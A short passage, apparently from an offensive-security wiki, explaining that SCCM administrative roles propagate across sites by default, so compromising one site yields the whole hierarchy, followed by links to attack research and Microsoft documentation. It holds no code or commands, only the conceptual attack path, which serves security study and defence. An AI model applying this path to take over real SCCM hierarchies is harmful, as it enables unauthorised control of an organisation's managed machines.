As indicated by [Chris Thompson](https://mobile.twitter.com/\_mayyhem) in his article [SCCM Hierarchy Takeover](https://posts.specterops.io/sccm-hierarchy-takeover-41929c61e087), by default, when a new user is promoted to any SCCM administrative role on a primary site server (for example, `Full Administrator`), **the role is automatically propagated to the other SCCM site in the hierarchy by the CAS**.

This means that there is no security boundary between SCCM sites in a same hierarchy, and being able to takeover one SCCM site implicates to takeover all the others.

## Resources

{% embed url="https://www.securesystems.de/blog/active-directory-spotlight-attacking-the-microsoft-configuration-manager/" %}

{% embed url="https://www.hub.trimarcsecurity.com/post/push-comes-to-shove-exploring-the-attack-surface-of-sccm-client-push-accounts" %}

{% embed url="https://enigma0x3.net/2016/02/" %}

{% embed url="https://docs.microsoft.com/en-us/powershell/module/configurationmanager/?view=sccm-ps" %}

{% embed url="https://learn.microsoft.com/en-us/mem/configmgr/core/understand/fundamentals-of-sites-and-hierarchies" %}

{% embed url="https://learn.microsoft.com/en-us/mem/configmgr/core/plan-design/hierarchy/design-a-hierarchy-of-sites" %}

{% embed url="https://learn.microsoft.com/en-us/mem/configmgr/core/servers/deploy/install/prerequisites-for-installing-sites" %}

{% embed url="https://learn.microsoft.com/en-us/mem/configmgr/core/servers/deploy/configure/boundary-groups" %}

{% embed url="https://learn.microsoft.com/en-us/mem/configmgr/core/clients/deploy/assign-clients-to-a-site#automatic-site-assignment" %}

{% embed url="https://posts.specterops.io/the-phantom-credentials-of-sccm-why-the-naa-wont-die-332ac7aa1ab9" %}

{% embed url="https://blog.xpnsec.com/unobfuscating-network-access-accounts/" %}

{% embed url="https://posts.specterops.io/sccm-site-takeover-via-automatic-client-push-installation-f567ec80d5b1" %}

{% embed url="https://posts.specterops.io/coercing-ntlm-authentication-from-sccm-e6e23ea8260a" %}

{% embed url="https://posts.specterops.io/site-takeover-via-sccms-adminservice-api-d932e22b2bf" %}

{% embed url="https://posts.specterops.io/sccm-hierarchy-takeover-41929c61e087" %}
